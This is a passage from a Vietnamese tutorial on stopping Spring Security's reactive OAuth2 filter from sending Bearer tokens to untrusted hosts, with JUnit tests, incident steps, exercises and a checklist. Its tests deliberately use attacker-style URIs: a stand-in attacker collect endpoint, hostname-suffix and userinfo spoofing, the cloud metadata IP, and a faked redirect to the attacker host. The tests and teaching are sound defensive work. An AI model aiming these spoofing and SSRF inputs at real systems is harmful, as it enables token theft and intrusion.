            "https://127.0.0.1/metadata")));
        assertFalse(guard.permitted(URI.create(
            "https://[::1]/metadata")));
    }

    @Test
    void rejectsFragmentAndRelativeTarget() {
        assertFalse(guard.permitted(URI.create(
            "https://api.billing.example.invalid/x#fragment")));
        assertFalse(guard.permitted(URI.create("/v1/invoices")));
    }

    @Test
    void constructorRejectsInsecureTrustedOrigin() {
        assertThrows(IllegalArgumentException.class, () ->
            new DestinationGuard(
                URI.create("http://api.billing.example.invalid")));
    }
}
```

**10 unit test methods** đánh giá URI policy; không có network call và không dùng token. Trong production test cần mở rộng phân biệt IPv4/IPv6, IDN/punycode, DNS rebinding, proxy routing, URL canonicalization và path segmentation nếu host có nhiều APIs.

## 9. Tests OAuth2 filter + fake manager + fake HTTP transport

Mục tiêu của nhóm test này là chứng minh **filter thật của Spring Security** gắn Bearer token chỉ khi URI được phép. Ta sử dụng:

- Fake `ReactiveOAuth2AuthorizedClientManager` trả `OAuth2AuthorizedClient` với một token vô giá trị ngoài unit test.
- Fake `ExchangeFunction` thu request cuối, đếm số lần gọi, không mở socket.
- `DestinationGuard` đứng trước OAuth2 filter.
- `RejectRedirectsFilter` từ chối response 3xx.
- `StepVerifier` kiểm tra signals từ reactive pipeline.

File `src/test/java/demo/tokenbound/OAuthClientBoundaryTests.java`:

```java
package demo.tokenbound;

import java.net.URI;
import java.time.Instant;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

import org.junit.jupiter.api.Test;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.authority.AuthorityUtils;
import org.springframework.security.core.context.ReactiveSecurityContextHolder;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClient;
import org.springframework.security.oauth2.client.ReactiveOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.registration.ClientRegistration;
import org.springframework.security.oauth2.client.web.reactive.function.client.ServerOAuth2AuthorizedClientExchangeFilterFunction;
import org.springframework.security.oauth2.core.AuthorizationGrantType;
import org.springframework.security.oauth2.core.ClientAuthenticationMethod;
import org.springframework.security.oauth2.core.OAuth2AccessToken;
import org.springframework.web.reactive.function.client.ClientRequest;
import org.springframework.web.reactive.function.client.ClientResponse;
import org.springframework.web.reactive.function.client.ExchangeFunction;
import org.springframework.web.reactive.function.client.WebClient;

import reactor.core.publisher.Mono;
import reactor.test.StepVerifier;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.springframework.security.oauth2.client.web.reactive.function.client.ServerOAuth2AuthorizedClientExchangeFilterFunction.clientRegistrationId;

class OAuthClientBoundaryTests {

    private static final String BASE =
        "https://api.billing.example.invalid";

    private record Harness(
            WebClient webClient,
            AtomicInteger managerCalls,
            AtomicInteger transportCalls,
            AtomicReference<ClientRequest> observed) {
    }

    private Harness harness(HttpStatus status) {
        AtomicInteger managerCalls = new AtomicInteger();
        AtomicInteger transportCalls = new AtomicInteger();
        AtomicReference<ClientRequest> observed =
            new AtomicReference<>();

        ClientRegistration registration =
            ClientRegistration.withRegistrationId("billing-api")
                .clientId("test-client")
                .clientSecret("test-secret")
                .clientAuthenticationMethod(
                    ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
                .authorizationGrantType(
                    AuthorizationGrantType.CLIENT_CREDENTIALS)
                .tokenUri(
                    "https://auth.billing.example.invalid/oauth/token")
                .build();

        var token = new OAuth2AccessToken(
            OAuth2AccessToken.TokenType.BEARER,
            "unit-test-token-only",
            Instant.now().minusSeconds(60),
            Instant.now().plusSeconds(3600));

        ReactiveOAuth2AuthorizedClientManager manager = request -> {
            managerCalls.incrementAndGet();
            return Mono.just(new OAuth2AuthorizedClient(
                registration, "service-test-principal", token));
        };

        var oauth2 =
            new ServerOAuth2AuthorizedClientExchangeFilterFunction(
                manager);
        oauth2.setDefaultOAuth2AuthorizedClient(false);

        ExchangeFunction transport = request -> {
            transportCalls.incrementAndGet();
            observed.set(request);

            ClientResponse.Builder builder =
                ClientResponse.create(status);
            if (status.is3xxRedirection()) {
                builder.header(HttpHeaders.LOCATION,
                    "https://attacker.example.invalid/collect");
            }
            return Mono.just(builder.body("ok").build());
        };

        WebClient web = WebClient.builder()
            .baseUrl(BASE)
            .filter(new DestinationGuard(URI.create(BASE)))
            .filter(oauth2)
            .filter(new RejectRedirectsFilter())
            .exchangeFunction(transport)
            .build();

        return new Harness(
            web, managerCalls, transportCalls, observed);
    }

    private Mono<String> get(
            Harness harness, String uri, boolean useOAuth) {
        WebClient.RequestHeadersSpec<?> spec =
            harness.webClient().get().uri(uri);

        if (useOAuth) {
            spec = spec.attributes(
                clientRegistrationId("billing-api"));
        }

        var principal =
            UsernamePasswordAuthenticationToken.authenticated(
                "service-test-principal",
                "unused",
                AuthorityUtils.createAuthorityList("ROLE_SERVICE"));

        return spec.retrieve().bodyToMono(String.class)
            .contextWrite(
                ReactiveSecurityContextHolder.withAuthentication(
                    principal));
    }

    @Test
    void trustedHostGetsBearerToken() {
        Harness h = harness(HttpStatus.OK);

        StepVerifier.create(get(h, "/v1/invoices/42", true))
            .expectNext("ok")
            .verifyComplete();

        assertEquals(1, h.managerCalls().get());
        assertEquals(1, h.transportCalls().get());
        assertEquals("Bearer unit-test-token-only",
            h.observed().get().headers()
                .getFirst(HttpHeaders.AUTHORIZATION));
        assertEquals("api.billing.example.invalid",
            h.observed().get().url().getHost());
    }

    @Test
    void missingRegistrationDoesNotAttachToken() {
        Harness h = harness(HttpStatus.OK);

        StepVerifier.create(get(h, "/v1/invoices", false))
            .expectNext("ok")
            .verifyComplete();

        assertEquals(0, h.managerCalls().get());
        assertEquals(1, h.transportCalls().get());
        assertNull(h.observed().get().headers()
            .getFirst(HttpHeaders.AUTHORIZATION));
    }

    private void assertBlocked(String uri) {
        Harness h = harness(HttpStatus.OK);

        StepVerifier.create(get(h, uri, true))
            .expectError(
                DestinationGuard.DestinationRejectedException.class)
            .verify();

        assertEquals(0, h.managerCalls().get());
        assertEquals(0, h.transportCalls().get());
    }

    @Test
    void blocksAttackerServerBeforeLookup() {
        assertBlocked("https://attacker.example.invalid/collect");
    }

    @Test
    void blocksHostnameSuffixSpoofing() {
        assertBlocked(
            "https://api.billing.example.invalid.attacker.invalid/x");
    }

    @Test
    void blocksHttpDowngrade() {
        assertBlocked("http://api.billing.example.invalid/x");
    }

    @Test
    void blocksPort8443() {
        assertBlocked("https://api.billing.example.invalid:8443/x");
    }

    @Test
    void blocksUserInfoHostConfusion() {
        assertBlocked(
            "https://api.billing.example.invalid@attacker.invalid/x");
    }

    @Test
    void blocksMetadataIp() {
        assertBlocked("https://169.254.169.254/latest/meta-data");
    }

    @Test
    void acceptsTrustedExplicitPort443() {
        Harness h = harness(HttpStatus.OK);

        StepVerifier.create(get(h,
                "https://api.billing.example.invalid:443/v1/invoices",
                true))
            .expectNext("ok")
            .verifyComplete();

        assertEquals(1, h.transportCalls().get());
        assertEquals("Bearer unit-test-token-only",
            h.observed().get().headers()
                .getFirst(HttpHeaders.AUTHORIZATION));
    }

    @Test
    void rejectsCrossOriginRedirect() {
        Harness h = harness(HttpStatus.FOUND);

        StepVerifier.create(get(h, "/v1/invoices", true))
            .expectError(IllegalStateException.class)
            .verify();

        assertEquals(1, h.transportCalls().get());
        assertEquals("api.billing.example.invalid",
            h.observed().get().url().getHost());
    }

    @Test
    void publicWebClientNeverGetsOAuthHeader() {
        AtomicReference<ClientRequest> captured =
            new AtomicReference<>();

        WebClient publicHttp = WebClient.builder()
            .exchangeFunction(request -> {
                captured.set(request);
                return Mono.just(
                    ClientResponse.create(HttpStatus.OK)
                        .body("public").build());
            })
            .build();

        StepVerifier.create(publicHttp.get()
                .uri("https://public.example.invalid/status")
                .retrieve()
                .bodyToMono(String.class))
            .expectNext("public")
            .verifyComplete();

        assertNull(captured.get().headers()
            .getFirst(HttpHeaders.AUTHORIZATION));
    }
}
```

Nhóm này có **11 test methods**:

1. Allowed relative URI với registration đúng → manager được gọi, Bearer có trong outbound mock.
2. Không có explicit registrationId → không gắn Bearer và không gọi manager.
3. Absolute URI sang host attacker → bị chặn trước manager.
4. Host suffix spoof → bị chặn.
5. HTTP downgrade → bị chặn.
6. Port 8443 → bị chặn.
7. Userinfo `trusted@attacker` → bị chặn.
8. Metadata IP literal → bị chặn.
9. HTTPS đúng host/port 443 → được phép.
10. HTTP 302 về host khác → error và chỉ một mock transport call.
11. Client không có OAuth filter → header Authorization trống.

**Giới hạn kiểm thử:** Fake `ExchangeFunction` không mở socket thật; số lần gọi `transportCalls` không chứng minh firewall, DNS hoặc redirect bên dưới Reactor Netty trong deployment. Riêng `followRedirect(false)` ở cấu hình production vẫn cần integration test với test HTTP server, reverse proxy và redirect chain.

### 9.1. Lệnh chạy test

```bash
./gradlew test
```

PowerShell:

```powershell
.\gradlew.bat test
```

Tổng cộng **21 test methods** (10 + 11) được định nghĩa. Kết quả mong đợi là PASS trên project Java17+/Boot3.5/Security6.5 phù hợp. Đây là **kỳ vọng dựa trên source code**, không phải xác nhận Gradle đã được thực thi trong môi trường người học.

Trong staging, test thêm:
- HTTP client thật với fake Bearer token và mock Resource Server.
- 302/303/307/308 qua network stack, khẳng định không có hop đến host thứ hai.
- TLS certificate/hostname validation, không cho `trustAll`.
- Proxy/service mesh có thể rewrite routing hay không.
- DNS/IP egress policy và private/metadata endpoints.
- Resource Server từ chối token `aud` sai.
- Không có Authorization trong logs/APM/traces.

## 10. Vấn đề vận hành và lỗi thường gặp

### 10.1. 401/403 không phải lý do thử API khác bằng cùng token

Một Resource Server trả 401 có thể do expired/invalid token; 403 có thể do scope/role/audience không đủ. Không tự “fallback” sang host khác với cùng Bearer token để tránh lỗi.

Spring Security filter có cơ chế `ReactiveOAuth2AuthorizationFailureHandler` theo constructor/configuration:
- Khi xây bằng `ReactiveOAuth2AuthorizedClientManager`, một số handling cho HTTP 401/403 từ Resource Server cần tự cấu hình để remove invalid authorized client khi thích hợp.
- Constructor nhận `ReactiveClientRegistrationRepository` và `ServerOAuth2AuthorizedClientRepository` có behavior khác được nêu trong Javadoc.
- Chọn policy refresh/reauthorize theo grant, không retry vô hạn hoặc tự ghi đè token.
- Với `client_credentials` ở background, dùng service manager đúng context.
- Không log token body của authorization server khi lỗi.

### 10.2. Log redaction

Các thông tin nên log:
- Route template/operation name.
- Normalized target hostname đã allowlisted.
- RegistrationId phi nhạy cảm.
- Kết quả guard (allowed/rejected), HTTP status, latency.
- Correlation ID, error category.

Không log:
- Access token, refresh token, client secret.
- Authorization/Cookie/Set-Cookie.
- Raw URL với token/PII query.
- Token endpoint response body, JWT toàn văn.
- Request/response body chứa thông tin cá nhân trừ khi có cơ chế redaction/retention.

### 10.3. Sự cố token đã lộ

Nếu phát hiện Bearer token đã gửi tới third-party host:
1. Chặn đường outbound gây rò ngay.
2. Ghi nhận host, thời điểm, registration, phạm vi sự cố mà không copy token vào ticket/chat.
3. Thu hồi hoặc rotate token/credentials khi phù hợp; token JWT tự chứa có thể không revoke tức thì nếu Resource Server không kiểm tra danh sách thu hồi.
4. Kiểm tra logs, proxy, APM và third-party stores có giữ Authorization.
5. Review hành động mà token có thể đã được sử dụng trong thời gian còn hiệu lực.
6. Siết egress policy, token scopes/audiences/TTL, guard và negative tests.
7. Thực hiện incident response và thông báo theo quy trình của tổ chức.

### 10.4. Bảng triệu chứng

| Triệu chứng | Nguyên nhân có thể | Khắc phục |
|---|---|---|
| Token Billing xuất trong request telemetry | Shared WebClient với default OAuth authorized client | Tách clients, bỏ defaults và explicit registration + guard |
| URL absolute vượt baseUrl | baseUrl chỉ resolve relative URI | Kiểm tra ClientRequest.url() trước token filter |
| `contains` pass hostname giả | So raw string | Parse URI, exact getHost() |
| `trusted@attacker` bị hiểu sai | Userinfo giả dạng host | Reject userinfo, so parsed host |
| Token gửi qua HTTP/8443 | Chỉ check host | Enforce HTTPS và port |
| Sau 302 request đi host mới | Auto redirect trong transport/proxy | followRedirect(false), reject 3xx, test thật |
| Guard reject nhưng manager vẫn được gọi | Guard sau OAuth2 filter | Đặt guard trước và test managerCalls=0 |
| Client_credentials ở job không có token | Dùng manager phụ thuộc ServerWebExchange | Service-oriented manager |
| Resource Server 401/403 liên tục | Token/audience/scope hoặc failure handler sai | Kiểm tra issuer/aud/scope/refresh, không thử host khác |
| Token rò vào logs dù network bị chặn | Logger trước guard hoặc trace headers | Redaction, không log Authorization |
| DNS đúng host nhưng IP sai | Rebinding, private IP routing | Resolver/egress ACL và TLS validation |
| Cùng host nhưng khác tenant API | Shared origin | Path/tenant policy, separate audience |
| Mock tests PASS nhưng production leak | Mock không thực thi transport redirects | Integration network/proxy/Netty tests |
| Resource Server chấp nhận token sai aud | Thiếu audience validation | Validate issuer/aud/expiry/scopes |
| WebClient mutate làm mất guard | Caller chỉnh filters | Expose typed gateway thay raw WebClient |
| Token bị gửi trong URL query | Dùng query param hoặc redirect | Dùng Authorization header tới trusted origin |

## 11. Bài tập có đáp án

### Bài 1 — Dùng default OAuth client

Một WebClient cấu hình `setDefaultOAuth2AuthorizedClient(true)` rồi dùng cả cho Billing và Weather API. Có nguy cơ gì?

**Đáp án:** Access token của OAuth2 login user có thể bị gắn lên requests tới Weather API, dù token chỉ dành cho Billing. Tách WebClient, không dùng default rộng, explicit registration và host guard.

### Bài 2 — baseUrl có khóa host không?

`baseUrl("https://api.billing.example.invalid")` nhưng service gọi `uri("https://attacker.example.invalid")`.

**Đáp án:** Không khóa được. URL absolute có thể override baseUrl. Phải validate URL đã resolve trong ClientRequest trước OAuth2 filter.

### Bài 3 — setDefaultClientRegistrationId có tạo allowlist không?

**Đáp án:** Không. Nó chọn OAuth client mặc định, không kiểm tra đích HTTP. Một token thuộc billing registration vẫn có thể bị gửi đến host ngoài allowlist.

### Bài 4 — contains sai ở đâu?

URL `https://api.billing.example.invalid.attacker.invalid` chứa trusted hostname.

**Đáp án:** Parsed host thực là subdomain thuộc attacker.invalid; so raw string là lỗi. Dùng exact `URI.getHost()`, HTTPS, port và reject userinfo.

### Bài 5 — Đúng host, sai port

Target `https://api.billing.example.invalid:8443/x` có được phép theo guard demo không?

**Đáp án:** Không. Policy chỉ chấp nhận port 443 hoặc default HTTPS. Một service khác trên cùng host/port khác không tự có quyền nhận Billing token.

### Bài 6 — Redirect qua host khác

Resource Server đúng host trả HTTP 302 sang attacker. Vì sao không nên để client tự follow?

**Đáp án:** Một số redirect diễn ra bên dưới WebClient filter, chính sách chuyển tiếp header tùy connector/cấu hình; guard request đầu không tự kiểm tra redirect hop. Chặn auto-follow, kiểm tra lại từng hop nếu thật cần và không relay Bearer bừa bãi.

### Bài 7 — JWT có aud sai nhưng chữ ký hợp lệ

Token có `scope=invoice.read`, `aud=hr-api`. Billing Resource Server có được chấp nhận vì signature hợp lệ?

**Đáp án:** Không. Phải validate audience đúng Billing API bên cạnh issuer/signature/expiry/scope. Scope không thay audience.

### Bài 8 — DNS rebinding

Host đúng allowlist nhưng DNS trả IP 169.254.169.254. Guard Java nhận ra không?

**Đáp án:** Không nếu chỉ so hostname ở URI. Cần network-layer egress/IP policy, DNS resolver đáng tin, chặn metadata endpoints và TLS hostname validation.

### Bài 9 — Có thể log Authorization để debug 401?

**Đáp án:** Không. Log registrationId/status/error category/route/host đã chuẩn hóa, không log raw token/header/secret hoặc query nhạy cảm.

### Bài 10 — Fake transport chứng minh gì?

Mock `ExchangeFunction` thấy transportCalls=0 khi blocked.

**Đáp án:** Chứng minh filter chain đã chặn trước mock transport và manager theo đúng unit test. Nó chưa chứng minh không có redirect ở Reactor Netty/proxy thật hoặc DNS rebinding; cần integration tests và egress controls.

### Bài 11 — Sao background job không tìm được user token?

**Đáp án:** Job thường không có ServerWebExchange/Authentication của browser user. Với client_credentials, dùng `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager`/service principal. Nếu cần user delegation, sử dụng workflow/token exchange đúng policy.

### Bài 12 — Shared host nhiều APIs

Allowlist hostname đúng nhưng trên đó có HR và Billing service. Có đủ an toàn không?

**Đáp án:** Chưa. Phải cố định path/service identity/tenant và ràng buộc token bằng audience/scope. Resource Server phải từ chối token dành cho service khác.

### Bài 13 — URL chứa userinfo

`https://api.billing.example.invalid@attacker.invalid/` là URL đến host nào?

**Đáp án:** Host là attacker.invalid; phần bên trái ký tự @ là userinfo. Guard parse URI/getHost và reject userinfo.

### Bài 14 — Có nên dùng cùng token cho nhiều APIs?

**Đáp án:** Chỉ khi Authorization Server cấp rõ audience/scopes cho các resources và tất cả API kiểm tra đúng chính sách. Theo least privilege, ưu tiên token riêng hẹp cho từng API, không mặc định reuse mọi nơi.

### Bài 15 — Sau khi phát hiện token leak

**Đáp án:** Chặn đường rò, đánh giá cấp quyền/cửa sổ token, thu hồi/rotate phù hợp, điều tra logs/traces và việc token có thể đã bị dùng, siết scopes/aud/TTL, thêm guard/egress và báo cáo sự cố theo quy trình.

## 12. Checklist production

- [ ] Định nghĩa trusted resource server origins theo cấu hình server-side, không nhận arbitrary URL từ user.
- [ ] Không dùng `setDefaultOAuth2AuthorizedClient(true)` với shared WebClient.
- [ ] Không dùng `setDefaultClientRegistrationId(...)` để ngụ ý host allowlist.
- [ ] Chỉ chọn client bằng explicit `clientRegistrationId(...)` tại call site đã review.
- [ ] DestinationGuard chạy **trước** ServerOAuth2AuthorizedClientExchangeFilterFunction.
- [ ] Scheme HTTPS, host exact, port phù hợp, userinfo/fragment/malformed URI bị từ chối.
- [ ] baseUrl không được xem là ranh giới bảo mật.
- [ ] Không auto-follow redirects; 3xx được xử lý fail-closed theo policy.
- [ ] Billing WebClient và public WebClient tách biệt, không global Authorization header.
- [ ] Typed gateway chỉ nhận business ID, không arbitrary destination URI.
- [ ] Shared host có path/tenant service-bound ACL và token audience đúng.
- [ ] Authorization Server cấp scopes/audiences tối thiểu; Resource Server validate issuer/aud/expiry/scope.
- [ ] TLS certificate chain và hostname verification bật, không trust-all SSL.
- [ ] DNS/IP egress policy chặn SSRF/rebinding/private/metadata targets ngoài ý muốn.
- [ ] API client/token manager đúng flow service vs user, xử lý refresh/401/403 có kiểm soát.
- [ ] Client secrets ở secret manager/env, rotation và access control.
- [ ] Logs/traces/APM/proxy không chứa Bearer token hoặc query secrets.
- [ ] Unit tests trusted/untrusted/suffix/userinfo/downgrade/port và manager not called.
- [ ] Integration tests network redirect, proxy, TLS/DNS và no-token-to-wrong-host.
- [ ] Có runbook thu hồi/rotate token khi sự cố.

## 13. Tóm tắt

```text
SAI:
  Shared WebClient + default authorized client
  + arbitrary URI
  -> Bearer token có thể tới host sai

ĐÚNG HƠN:
  BillingGateway.findInvoice(id)
  -> WebClient baseUrl trusted
  -> DestinationGuard HTTPS exact host:443
  -> OAuth2 filter + explicit registrationId=billing-api
  -> RejectRedirectsFilter
  -> Reactor Netty followRedirect(false)
  -> Billing Resource Server (validate audience, scope)

BỔ SUNG:
  DNS/IP/network egress controls + TLS verification
  RFC 8707 audience-bound token + least privilege
  Không log token, không token trong URL
  Kiểm thử filter và HTTP transport thật
```

**Kết luận:** `ServerOAuth2AuthorizedClientExchangeFilterFunction` giúp lấy và gắn token, **nhưng không tự quyết định server nào có quyền nhận token**. Hãy khóa destination ở ứng dụng trước OAuth2 filter, kiểm soát redirect/egress ở transport và yêu cầu Resource Server xác minh audience/scope. Không có một `baseUrl` hay `registrationId` đơn lẻ nào thay thế các lớp kiểm soát đó.

## Tài liệu chính thức

- [Spring Security 6.5 — Reactive OAuth2 Authorized Client Features](https://docs.spring.io/spring-security/reference/6.5/reactive/oauth2/client/authorized-clients.html)
- [Spring Security 6.5 — Reactive OAuth2 Client Core](https://docs.spring.io/spring-security/reference/6.5/reactive/oauth2/client/core.html)
- [Spring Security 6.5 — ServerOAuth2AuthorizedClientExchangeFilterFunction API](https://docs.spring.io/spring-security/reference/6.5/api/java/org/springframework/security/oauth2/client/web/reactive/function/client/ServerOAuth2AuthorizedClientExchangeFilterFunction.html)
- [Spring Security — AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager](https://docs.spring.io/spring-security/reference/6.5/api/java/org/springframework/security/oauth2/client/AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager.html)
- [Reactor Netty — HTTP Client redirects](https://projectreactor.io/docs/netty/release/reference/http-client.html)
- [OWASP — SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [RFC 6750 — Bearer Token Usage](https://www.rfc-editor.org/rfc/rfc6750)
- [RFC 8707 — Resource Indicators](https://www.rfc-editor.org/rfc/rfc8707)
- [RFC 9700 — OAuth 2.0 Security Best Current Practice](https://www.rfc-editor.org/rfc/rfc9700)
